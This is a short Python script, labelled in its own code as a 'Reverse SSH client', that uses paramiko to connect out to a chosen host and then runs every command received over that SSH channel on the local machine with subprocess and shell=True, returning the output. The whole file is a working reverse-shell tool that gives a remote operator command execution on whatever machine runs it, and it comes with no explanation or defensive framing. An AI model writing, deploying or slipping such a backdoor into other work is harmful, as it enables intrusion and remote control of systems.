import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=password)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send("ClientConnected")
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'ok')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import sys
    from ssh_parse import ssh_parse

    ns = ssh_parse(sys.argv[1:], program_name="Reverse SSH client")
    ssh_command(
        ip=ns.host,
        port=ns.port,
        user=ns.user,
        password=ns.password,
    )
